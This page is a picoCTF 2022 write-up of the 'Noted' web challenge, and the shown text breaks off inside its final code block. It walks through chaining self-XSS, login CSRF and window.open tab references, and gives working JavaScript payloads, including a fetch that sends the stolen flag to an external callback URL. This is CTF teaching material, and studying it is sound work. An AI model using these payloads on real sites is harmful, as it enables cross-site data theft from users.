@@ -1,0 +1,220 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="picoCTF writeup by Wakeful Cloud"><title>Noted</title><link rel=canonical href=https://bmhs-tsa.github.io/post/noted/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Noted"><meta property="og:description" content="picoCTF writeup by Wakeful Cloud"><meta property="og:url" content="https://bmhs-tsa.github.io/post/noted/"><meta property="og:site_name" content="BMHS TSA"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Web Exploitation"><meta property="article:tag" content="Wakeful Cloud"><meta property="article:published_time" content="2022-04-02T22:22:10-06:00"><meta property="article:modified_time" content="2022-04-02T22:22:10-06:00"><meta name=twitter:title content="Noted"><meta name=twitter:description content="picoCTF writeup by Wakeful Cloud"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-193505887-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.body.dataset.scheme="dark":document.body.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended article-page with-toolbar"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header class=site-info><figure class=site-avatar><img src=/images/avatar.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></figure><h1 class=site-name><a href=https://bmhs-tsa.github.io/>BMHS TSA</a></h1><h2 class=site-description>Battle Mountain High School Technology Student Association</h2></header><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></ol></aside><main class="main full-width"><div id=article-toolbar><a href=https://bmhs-tsa.github.io/ class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/picoctf-2022/>picoCTF 2022</a></header><h2 class=article-title><a href=/post/noted/>Noted</a></h2><h3 class=article-subtitle>picoCTF writeup by Wakeful Cloud</h3><footer class=article-time><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--published>Apr 02, 2022</time></footer></div></header><section class=article-content><h3 id=challenge-rating>Challenge Rating</h3><ul><li>Artificialness: <code>3/10</code></li><li>Skill: <code>8/10</code></li><li>Time: <code>2-3 days</code></li></ul><p><em>Learn more about how we rate challenges <a class=link href=/post/rating>here</a>.</em></p><h2 id=preface>Preface</h2><p>This write-up assumes you have a moderate to advanced understanding of SOP
+(Same-Origin Policy) and CORS (Cross-Origin Resource Sharing). If you don&rsquo;t, you
+should check out MDN&rsquo;s <a class=link href=https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy target=_blank rel=noopener>SOP</a>
+and <a class=link href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS target=_blank rel=noopener>CORS</a>
+articles. One other thing you should <em>note</em> (Pun intended) is that, despite what
+the challenge description says, the headless browser <strong>DOES</strong> have internet
+access. However, the exploit featured in this write-up does work without
+internet access.</p><h2 id=solving-the-challenge>Solving the challenge</h2><h3 id=exploring-the-website>Exploring the website</h3><p>The first thing I like to do with this sort of challenge is play around with
+the functioning website. This not only makes me to familiar with the features of
+the website, but also the overall architecture.</p><p>In this challenge, perhaps quite predictably, the website is a note-taking app
+There&rsquo;s a primitive account system with a registration and login page. There&rsquo;s
+also, of course, a page for creating and viewing/deleting notes. But there&rsquo;s
+one other feature: a <code>Report</code> button. If you&rsquo;ve played a lot of web CTFs, you&rsquo;re
+probably quite familiar with report buttons in challenges. Typically, they send
+a URL to a headless browser which navigates to it and this challenge is no
+different. But oftentimes, the scheme or domain is restricted, but maybe not for
+this challenge? We can check by looking at the source code.</p><h3 id=exploring-the-code>Exploring the code</h3><p><em>Note: in order to get access to the source code, you can download it from <a class=link href=https://artifacts.picoctf.net/c/286/noted.tar.gz target=_blank rel=noopener>here</a> or click the <code>Launch Instance</code> button in picoGym and you should see a download link.</em></p><p>Thankfully, the code base isn&rsquo;t too large and I was able to skim over everything
+fairly quickly. This confirmed that there were no restrictions on the report URL.
+Maybe we can use <a class=link href=https://en.wikipedia.org/wiki/Bookmarklet#History target=_blank rel=noopener><code>javascript</code> URL&rsquo;s</a>?
+I also noticed that the headless browser navigates to the account creation page,
+creates an account with a completely random username and password, then creates
+a note with the flag in it. Then, it navigates to <code>about:blank</code> and finally the
+URL we control. If you&rsquo;re curious as to why it navigates to <code>about:blank</code>, this
+prevents us from sending the below JavaScript (Via a <code>javascript</code> URL):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//Get the flag
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>).</span><span class=nx>innerText</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Exfiltrate
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;[Callback URL here; check out https://hookbin.com]&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nx>body</span><span class=o>:</span> <span class=nx>flag</span>
+</span></span><span class=line><span class=cl><span class=p>});</span>
+</span></span></code></pre></div><p>That would&rsquo;ve made this challenge considerably easier, but it seems <a class=link href=https://larry.sh/ target=_blank rel=noopener>EHHTHING</a>
+(The challenge author) already thought of that. Shucks! However, I noticed
+that the notes page is vulnerable to self-XSS (Since there&rsquo;s absolutely zero
+sanitization). But alas, I was a bit stuck. I started to examine the hints a
+little more closely. For reference, they are:</p><ol><li>Are you sure I followed all the best practices?</li><li>There&rsquo;s more than just HTTP(S)!</li><li>Things that require user interaction normally in Chrome might not require it
+in Headless Chrome.</li></ol><p>It&rsquo;s safe to say that hint #1 is related to not sanitizing user input and #2 is
+related to <code>javascript</code> URL&rsquo;s. But I was confused about #3. I thought that I may
+need to navigate backwards, grab the flag, and exfiltrate. Surely that&rsquo;s not too
+hard, right? Well several days went by until I finally gave up on this idea.
+It&rsquo;s not that it was difficult to navigate backwards (The <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/History target=_blank rel=noopener>history API</a>
+can do that), it&rsquo;s just that you can&rsquo;t execute code once the browser navigates
+backwards, otherwise it would totally bypass the same-origin policy.</p><h3 id=dialogs>Dialogs</h3><p>I was starting to think that there might be some dialog the shows up in headful
+browsers, but to prevent interference, the headless browser auto-closes or
+auto-accepts something. If the headless browser allowed me to say, take a
+screenshot or print a tab without user-interaction, I could open a tab with the
+flag on it, take a screenshot or print it, and then upload the image buffer.
+This rabbit hole lead me to search through the entire Chromium repository for
+any behavior the <code>--headless</code> flag modifies (I knew it was Chrome since it&rsquo;s
+installed in the <code>Dockerfile</code>). Unfortunately for me, only very minor behavior
+related to PDF printing changes with the <code>--headless</code> flag.</p><p>By now, I was very puzzled by hint #3 - to be honest, at the time of writing
+this, I still don&rsquo;t entirely know what it was referring to. But I also knew
+there must be a way, so I persevered.</p><h3 id=research--development>Research & development</h3><p>I figured that the best way to proceed was to take a step back, read some
+write-ups from other CTFs, and just let the creative juices flow. I kept finding
+write-ups like <a class=link href=https://blog.s1r1us.ninja/CTF/bytebandits-ctf-2020 target=_blank rel=noopener>this one</a>
+that demonstrated how you can use iFrames to bypass the same-origin policy.
+It looked fairly relevant, so I tried it out. However, this exploit requires
+the server to set the <code>SameSite=none</code> (Now that <a class=link href=https://chromestatus.com/feature/5088147346030592 target=_blank rel=noopener>cookies in Chrome default to Lax</a>). I kept reading, and
+eventually stumbled across <a class=link href=https://ctftime.org/writeup/30882 target=_blank rel=noopener>this write-up</a>
+(Which I urge you to read after this). It demonstrated a very similar approach,
+except instead of using iFrames, it used separate tabs. After reading it, I
+immediately began formulating a plan of attack:</p><ol><li>Use the self-XSS vulnerability to create a malicious note</li><li>Send a <code>javascript</code> URL to the headless browser (Tab 1), which will:<ol><li>Open the page with the flag on it (Tab 2)</li><li>Log in to an account we control (Tab 3)</li></ol></li><li>The malicious note (on tab 3) will then:<ol><li>Get a reference to tab 2 (with the flag)</li><li>Extract the flag from tab 2</li><li>Exfiltrate the flag</li></ol></li></ol><p><img src=/post/noted/diagram.png alt=Diagram></p><p>Because both the tab with the flag and the tab with the malicious note are from
+the same origin, we completely bypass the same-origin policy.</p><h3 id=solving-the-remaining-problems>Solving the remaining problems</h3><p>Unfortunately, there are a few problems to this approach:</p><ol><li>How can we make the headless browser sign into an account we control (Since
+CORS prevents us from making the login request from a null origin and opaque
+requests won&rsquo;t save the response)?</li><li>How to get a reference to an already-open tab?</li></ol><p>Thankfully, both of these are relatively easy to solve. I had actually
+pre-emptively solved the first problem, figuring I would need it to trigger the
+self-XSS. But to give credit where it&rsquo;s due, the aforementioned writeup helped
+me solve the second problem.</p><p>The first problem can be solved by looking at the
+website&rsquo;s front-end, specifically the login view. Instead of using <code>fetch</code> or
+<code>XMLHttpRequest</code>, we can create a form with the <a class=link href=https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#attr-action target=_blank rel=noopener>action attribute</a>
+set to the <strong>full</strong> login URL. We can programmatically create and submit the
+form using:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>//Settings
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=s1>&#39;aaaa&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=s1>&#39;bbbb&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Create the form
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>form</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;form&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>action</span> <span class=o>=</span> <span class=s1>&#39;http://0.0.0.0:8080/login&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>method</span> <span class=o>=</span> <span class=s1>&#39;POST&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>target</span> <span class=o>=</span> <span class=s1>&#39;_blank&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>usernameInput</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;text&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s1>&#39;username&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>usernameInput</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>passwordInput</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s1>&#39;password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>passwordInput</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>submit</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>submit</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;submit&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>submit</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Add to the document
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>form</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Submit
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>submit</span><span class=p>.</span><span class=nx>click</span><span class=p>();</span>
+</span></span></code></pre></div><p>The second problem can be solved by examining <a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/Window/open target=_blank rel=noopener><code>window.open</code></a>.
+You see, if you open anything with the target parameter set to a specific value,
+you can obtain a reference to that same tab/window by &ldquo;opening&rdquo; the same
+tab/window again, except with an empty url. For example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>//Open a new tab/window, without saving the reference
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;https://example.com&#39;</span><span class=p>,</span> <span class=s1>&#39;someExampleWebsite&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Get the reference to the existing tab/window
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>reference</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;someExampleWebsite&#39;</span><span class=p>);</span>
+</span></span></code></pre></div><h3 id=final-exploit>Final Exploit</h3><p>Now it was time to piece it all together. To run the exploit yourself, create a
+note with the content:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//Only run in the headless browser
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>hostname</span> <span class=o>==</span> <span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//Get a reference to the flag window
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>flagWindow</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;flagWindow&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>//Get the flag
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>flagWindow</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>).</span><span class=nx>innerText</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>//Exfiltrate
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;[Callback URL here; check out https://hookbin.com]&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>mode</span><span class=o>:</span> <span class=s1>&#39;no-cors&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nx>body</span><span class=o>:</span> <span class=nx>flag</span>
+</span></span><span class=line><span class=cl>    <span class=p>});</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>However, if you want to stay true to the challenge and avoid using the internet,
+create a note with the below content. I&rsquo;ve omitted some comments to keep the
+note content under the 1000 character limit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//Settings
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=s1>&#39;aaaa&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=s1>&#39;bbbb&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>main</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>hostname</span> <span class=o>==</span> <span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>flagWindow</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;flagWindow&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>flagWindow</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;p&#39;</span><span class=p>).</span><span class=nx>innerText</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=c1>//Login to the account we control
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>body</span><span class=o>:</span> <span class=k>new</span> <span class=nx>URLSearchParams</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>          <span class=nx>username</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=nx>password</span>
+</span></span><span class=line><span class=cl>        <span class=p>})</span>
+</span></span><span class=line><span class=cl>      <span class=p>});</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=c1>//Get the CSRF token
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/new&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMParser</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>parseFromString</span><span class=p>(</span><span class=kr>await</span> <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>(),</span> <span class=s1>&#39;text/html&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;input[name=&#34;_csrf&#34;][type=&#34;hidden&#34;]&#39;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      <span class=c1>//Exfiltrate
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/new&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>body</span><span class=o>:</span> <span class=k>new</span> <span class=nx>URLSearchParams</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>          <span class=nx>title</span><span class=o>:</span> <span class=s1>&#39;Flag&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=nx>content</span><span class=o>:</span> <span class=nx>flag</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=s1>&#39;_csrf&#39;</span><span class=o>:</span> <span class=nx>token</span>
+</span></span><span class=line><span class=cl>        <span class=p>})</span>
+</span></span><span class=line><span class=cl>      <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nx>main</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p><em>Note: some concessions were made to keep the note length under 1000 characters.</em></p><p>Then update the settings of the below code (especially the credentials), uglify
+it using <a class=link href=https://uglifyjs.net/ target=_blank rel=noopener>UglifyJS</a> or something similar, prepend
+<code>javascript:</code> to it, report the URL, wait ~20 seconds, and check the callback
+URL or the notes page (depending on the exfiltration method).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>//Settings
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=s1>&#39;aaaa&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=s1>&#39;bbbb&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Open the flag window
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;http://0.0.0.0:8080&#39;</span><span class=p>,</span> <span class=s1>&#39;flagWindow&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Create the form
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>form</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;form&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>action</span> <span class=o>=</span> <span class=s1>&#39;http://0.0.0.0:8080/login&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>method</span> <span class=o>=</span> <span class=s1>&#39;POST&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>target</span> <span class=o>=</span> <span class=s1>&#39;_blank&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>usernameInput</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;text&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s1>&#39;username&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>usernameInput</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>usernameInput</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>passwordInput</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;password&#39;</span><span class=p>;</span>
